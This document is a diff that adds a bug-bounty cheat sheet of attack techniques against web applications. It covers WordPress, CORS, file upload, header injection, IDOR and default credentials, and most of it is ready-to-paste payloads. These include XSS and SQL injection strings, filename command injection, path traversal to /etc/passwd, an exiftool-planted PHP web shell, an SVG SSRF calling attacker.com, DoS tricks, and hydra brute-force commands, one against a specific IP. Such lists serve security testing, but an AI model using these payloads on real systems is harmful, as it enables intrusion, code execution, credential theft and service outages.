+	- if saw data then lack of cache poisoning headers 
+
+5- create account with email  A 	not verified 
+	- change the email address to email B 
+	- send verification and verify email B
+	- change the email back again to email A
+	- if shown that email A is verifed then ( bug )
+	
+6- create account with your own email 
+	- request verfication link
+	- don't use verification link 
+	- change the email to victim email and then use link send to your own email 
+	- if account 2 verified then (bug)
+
+7- old password reset token not expiring even after requesting or using the latter one 
+
+8- create account and change details 
+	- capture the request and send it to repeater 
+	- logout from account 
+	- change some of details in repeater 
+	- go to account if found changes of repeater there then (bug )
+	
+	
+-------------------------------------------------------------------------------------------------------
+AEM 
+If you hunt on a Drupal website: fuzz with intruder on '/node/$' where '$' is a number (from 1 to 500 for example). You could find hidden pages (test, dev) which are not referenced by the search engines.
+tools:
+	- https://github.com/0ang3el/aem-hacker
+	- https://github.com/Raz0r/aemscan
+	-fuzzing wordlists => https://raw.githubusercontent.com/clarkvoss/AEM-List/main/paths
+	
+------------------------------------------------------------------------------------------------------
+Wordpress
+
+1- 	xmlrpc.php 	=> https://github.com/nullfd/xmlrpc-scan 	==> scanner 
+2- 	/wp-content/uploads		=> directory listing
+3- 	CVE-2021-24364	==> xss via wordpress before 5.4.4
+site.com/wp-admin/admin-ajax.php?action=tie_get_user_weather&options=%7B%27location%27%3A%27Cairo%27%2C%27units%27%3A%27C%27%2C%27forecast_days%27%3A%275%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3Ecustom_name%27%3A%27Cairo%27%2C%27animated%27%3A%27true%27%7D
+
+
+4- Wp Cornjob Dos
+	    visit site.com/wp-cron.php
+	    You will see a Blank page with 200 HTTP status code
+	    exploit: python3 doser.py -t 999 "http://site.com/wp-corn.php"
+	-	((( doser => https://github.com/quitten/doser.py	))))
+		
+5- User Enumeration 
+	visit : site.com/wp-json/wp/v2/users/
+	can exploit user and brute force it in xmlrpc.php
+
+-------------------------------------------------------------------------------------------------------
+Cors misconfigratoin
+1- get all subdomains
+	- cat httpx.txt | parallel -j 10 curl --proxy "http://127.0.0.1:8080" -sk 2>/dev/null
+	- search in burp for Access-Control 
+	- try to put Origin: hacker.com or Origin: null
+	- if Origin reflected then vuln to CORS
+
+Cors bypass
+    Origin:null
+    Origin:attacker.com
+    Origin:attacker.target.com
+    Origin:attackertarget.com
+    Origin:sub.attackertarget.com
+    Origin:attacker.com and then change the method Get to post/Post to Get
+    Origin:sub.attacker target.com
+    Origin:sub.attacker%target.com
+    Origin:attacker.com/target.com
+
+Automatic Scanners :- 
+    https://github.com/chenjj/CORScanner
+    https://github.com/lc/theftfuzzer
+    https://github.com/s0md3v/Corsy
+    https://github.com/Shivangx01b/CorsMe
+-----------------------------------------------------------------------------------------------------
+File Upload 
+
+1- If pdf accepted then upload xss.pdf  => https://github.com/teamhackeregypt/mythology/blob/main/xss.pdf
+2- if accepts pdf only then => hossam.html%00.pdf  ==> change Content-type: text/html
+3- if accepts html then make file.html with <img src=x onerror=alert(1)>
+4- check for file upload size which can lead to DOS attack 
+5- put very long name for filename to see if you can perform DOS
+6- bypassing restrictions => 
+		GIF 		GIF89;\x0a
+		PDF 		%PDF 
+		JPG/JPEG	\xFF\xD8\xFF\xDB
+		PNG 		\x89\x50\x4E\x47\x0D\x0A\x1A\x0A
+		XML		<?xml
+7- try to upload file.php with command execution
+8- paste the payload in the file name __img src=x
+onerror=alert(document.doamain)_-Copy.csv
+9- if svg allowed put the next payload before the end </svg>
+<script type="text/javascript">
+alert(11);
+</script>
+10- filename =>  ../../../tmp/lol.png
+11- sleep(10) — -.jpg
+12- filename=> <svg onload=alert(document.domain)>
+13- filename=> ; sleep 10;
+14- upload file with same name already exist to see the abslute path 
+15- upload directory with .asp extension as folder.asp\file.txt
+16- upload crossdomain.xml or clientaccesspolicy.xml 	=> vunl to cross site content hijacking
+17- upload xml multiple time 
+18- upload ...:.jpg 	==> can't be easily deleted 
+19- upload .jsp 
+20- upload huge file to make DOS
+21- use different file names as =>  .php3, phtml,  shell.p.phpp,  shell.txt.jpg.png.asp, shell.txt.jpg.png.asp
+22- filename= "file.php" 	=> Content-Type: application/x-php
+23- **PHP** → .phtm, phtml, .phps, .pht, .php2, .php3, .php4, .php5, .shtml, .phar, .pgif, .inc
+	**ASP** → asp, .aspx, .cer, .asa
+	**Jsp** → .jsp, .jspx, .jsw, .jsv, .jspf
+	**Coldfusion** → .cfm, .cfml, .cfc, .dbm
+	**Using random capitalization** → .pHp, .pHP5, .PhAr
+24- file.jpg.php
+	file.php.jpg
+	file.php.blah123jpg
+	file.php%00.jpg
+	file.php\x00.jpg this can be done while uploading the file too, name it file.phpD.jpg and change the D (44) in hex to 00.
+	file.php%00
+	file.php%20
+	file.php%0d%0a.jpg
+	file.php.....
+	file.php/
+	file.php.\
+	file.php#.png
+	file.
+	.html
+25- upload .htaccess file 	==> can make reverse shell >https://github.com/wireghoul/htshells
+26- Set file name filename="svg onload=alert(document.domain)>" , filename="58832_300x300.jpg<svg onload=confirm()>"
+27- GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;		=> file.gif
+28- ssrf via file.svg
+	<?xml version="1.0" encoding="UTF-8" standalone="no"?><svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="200" height="200"><image height="200" width="200" xlink:href="https://attacker.com/picture.jpg" /></svg>
+29- filename ../../etc/passwd/logo.png	
+	'sleep(10).jpg
+	sleep(10)-- -.jpg
+30- Pixel flood attack using image, upload this image and Boom!!
+https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/malicious-images/lottapixel.jpg
+https://hackerone.com/reports/390#:~:text=By%20loading%20the%20'whole%20image,Photo%20Viewer%20on%20my%20computer.
+2. DoS with a large values name: 1234...99.png 
+/?file=xx.php    <- Blocked
+/?file===xx.php  <- Bypassed
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' shell.jpg 
+-----------------------------------------------------------------------------------------------------------------------------------------------------------------
+HTML INJECTION
+1- %27%22%3E%3Ch1%3Etest%3C%2Fh1%3E{{7777*7777}}JyI%2bPGgxPnRlc3Q8L2gxPgo=		==> html , ssti , xss injection 	==>| httpx -mr "<h1>akira</h1>|60481729"
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------
+headers injection with param miner 
+	-Host: redacted.com.evil.com
+	-Host: example.com?.mavenlink.com
+	-Host: javascript:alert(1);
+	-X-Forwarded-For: 1"AND(SELECT1(SELECT(SLEEP(100)))im4x)-- im4x
+	-X-Forwarded-For: <script>alert(11)</script>
+	- X-Forwarded-For: hossam'; waitfor delay '0:0:16' --		=> see in burpsuite 
+	
+2- ali ' OR 1=1-- 
+3-  	-	X_FORWARDED_FOR :127.0.0.1' or 1=1#
+ 	-	User-Agent: aaa' or 1/*
+	
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+IDOR
+1-	- GET /api_v1/messages --> 401	
+	-GET /api_v1/messages?user_id=victim_uuid --> 200
+
+2- param pollution
+	-GET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK
+	-GET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]
+
+3-add .json to end point 
+	-/user_data/2341.json --> 200 OK
+
+4-change the version of v1
+	-/v1/users_data/1234 --> 200 OK
+
+5- wrap json 
+	{“id”:111} --> 401 Unauthriozied
+	{“id”:[111]} --> 200 OK
+	{“id”:{“id”:111}} --> 200 OK
+	{“user_id”:<legit_id>,”user_id”:<victim’s_id>}	=> pollution
+
+6- send * instead of userid to grep all users
+	{"id":*}
+
+7- put the number in intruder with large range of numbers 
+
+8- change any word of user or users to admin , admins 
+	/api/users/myinfo	=> /api/admins/myinfo
+
+9- Replace requset to GET / POST / PUT 
+
+10- use Autorize burpsuite 
+
+11-   to make idor try to change requests between PUT => GET => POST and try to change all parameters 
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+Jira
+user tool Jira-Lens = > https://github.com/MayankPandey01/Jira-Lens 	to search and exploit jira
+
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+Default Credinals 
+1 - use hydra to make default credentials as #hydra -C /home/hossam/Seclists/Passwords/Default_Credentials/ftp_default.txt  example.com http-get /login
+
+2- search for third party credentials on google => critix => wordpress = > ..
+
+3-  `X-Orginal-URL: /admin` or `X-Rewrite-URL:/admin`
+
+4-    curl -u admin:admin 	http://example.com
+  curl http://admin:admin@example.com
+ 
+ 5- #hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
+
+---------------------------------------------------------------------------------------------------------------------------------------------
+
+
+
